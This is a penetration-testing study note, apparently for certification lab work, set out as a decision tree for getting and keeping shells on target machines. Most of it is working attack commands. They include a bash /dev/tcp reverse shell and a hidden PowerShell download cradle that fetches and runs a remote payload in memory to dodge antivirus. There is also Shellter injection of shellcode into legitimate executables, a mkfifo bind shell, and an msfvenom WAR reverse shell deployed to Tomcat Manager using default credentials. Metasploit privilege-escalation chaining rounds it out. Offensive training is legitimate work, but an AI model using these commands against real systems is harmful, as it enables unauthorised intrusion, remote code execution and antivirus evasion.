# Shells & Payloads, Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" for reverse shells and shell delivery.

---

### Got code execution, need a reverse shell
→ Linux target: `bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"`, URL-encode it if going through a web parameter
→ Windows target: PowerShell one-liner, base64-encode with Unicode first, deliver via `powershell -enc`
→ Always start the listener (`nc -nvlp <port>`) *before* triggering
→ See [[09. Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (Linux) and [[09. Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (Windows)
→ Generalized command reference: [[Linux Methodology#Step 2: Shells & Payloads|Linux]] / [[Windows Methodology#Step 2: Shells & Payloads|Windows]]

### Reverse shell landed
→ Immediately check `whoami` / `id` and `sudo -l` (Linux) or `whoami /priv` (Windows) before assuming you need to escalate. Web server processes on training VMs are often already root/SYSTEM

### `python3 -m http.server` isn't serving the file you expect (404s, or netcat never catches anything)
→ It serves whatever directory it was launched from. `cd` into the exact folder immediately before starting it, and check the server's own access log for a `200` before assuming the listener is broken
→ Full story: [[09. Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3 troubleshooting box]]

---

### Windows target and your .exe payload is getting caught by AV
→ Option 1: **PowerShell IEX in-memory injection** -- serve a `.ps1` reverse shell from Kali's HTTP server, victim runs it via download cradle, payload never touches disk so AV's on-access scanner has nothing to catch
  `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/payload.ps1')"`
→ Option 2: **Shellter PE injection** -- inject shellcode into a legitimate 32-bit Windows .exe (PuTTY, Spotify, etc.), AV sees a known-good binary envelope. Needs `wine32:i386` on Kali first, and a `WINEARCH=win32 wineboot` prefix reset if Wine ran before wine32 was installed
→ Option 3: **.bat wrapper** -- same IEX trick as Option 1 but packaged as a double-clickable `.bat` file, useful when PowerShell-direct execution is blocked but script delivery via FTP/SMB works
→ Mechanics of the PS flags: [[Antivirus Evasion (Breakdowns)#The PowerShell AV-bypass flags|Command Breakdowns]]
→ Full technique reference: [[15. Antivirus Evasion|Antivirus Evasion]]

### Shellter payload menu shows `[stager]`, or nc catches the connection then immediately drops it
→ The `[stager]` label means the binary is a two-stage payload: the first stage connects to your listener and asks for the second stage payload to be sent back. **nc has no idea how to respond to that request** -- it accepts the TCP connection, the stager sends its "give me stage 2" bytes, nc sends nothing back, both sides hang up
→ Use msfconsole `multi/handler` instead:
  ```
  use multi/handler
  set PAYLOAD windows/shell/reverse_tcp      # slash = staged shell; must match the binary type
  set LHOST <kali_ip>
  set LPORT <port>
  run
  ```
→ Slash vs underscore matters: `windows/shell/reverse_tcp` (slash, staged) is correct. `windows/shell_reverse_tcp` (underscore, stageless) gives "Session is not valid and will be closed" immediately if your binary is a stager
→ For Meterpreter stagers: `set PAYLOAD windows/meterpreter/reverse_tcp` (slash)
→ Mechanics of why staged payloads need a handler: [[Antivirus Evasion (Breakdowns)#Staged vs stageless payloads|Command Breakdowns]]
→ Seen live: [[15. Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|Antivirus Evasion, 15.3.3]]

---

### Reverse shell won't connect back — target is behind NAT or strict egress filtering

→ Switch to a **bind shell**: you open a listener on the TARGET and connect TO it from Kali, so no outbound traffic from the target required.

Linux bind shell (mkfifo, no nc -e required):
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f
```
Then from Kali: `nc <target-ip> 4444`

→ Bind shells require the target port to be reachable from Kali (i.e. inbound filtering must allow it). If that's also blocked, you're stuck: reverse shell through allowed egress ports (80/443) is the only escape.
→ MSF `multi/handler` can also catch bind: `set payload linux/x86/shell/bind_tcp` + `set RHOST <target>` + `run`
→ Full reference: [[Shells & Payloads#Bind shells|Command Appendix]]

---

### Found Tomcat Manager App accessible (or have Tomcat credentials)

→ Deploy a **WAR reverse shell**:
```bash
# 1. Generate the WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<kali-ip> LPORT=4444 -f war -o shell.war

# 2. Upload via Manager App web UI (http://target:8080/manager/html → Deploy WAR)
# OR via curl:
curl -u admin:password -T shell.war http://target:8080/manager/deploy?path=/shell

# 3. Start listener
nc -nvlp 4444

# 4. Trigger
curl http://target:8080/shell/
```
→ Default Tomcat Manager credentials to try: `admin:admin`, `tomcat:tomcat`, `tomcat:s3cret`, `admin:s3cret`
→ Full reference: [[06. Information Gathering|CS.11]], [[Shells & Payloads#Tomcat WAR|Command Appendix]]

---

### Got a Metasploit session but need to run a local privilege escalation module on top of it

→ Use **session chaining**, background the current session, run the local exploit with `SESSION` pointing at it:
```
# In msfconsole:
background          # or Ctrl-Z
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Once you pick an exploit:
use exploit/windows/local/cve_2023_29360_truesight
set SESSION 1
run
```
→ `sessions -l` lists open sessions; `sessions -i <N>` reconnects; `sessions -k <N>` kills one.
→ `setg LHOST <kali-ip>` sets LHOST globally so you don't need to retype it per module.
→ Full reference: [[Shells & Payloads#MSF Session Management|Command Appendix]]

#### Tags: #AntivirusEvasion #Shellter #StagedPayload #PowerShellInjection #MultiHandler #BindShell #Tomcat #MSF #SessionChaining
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for transformations
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
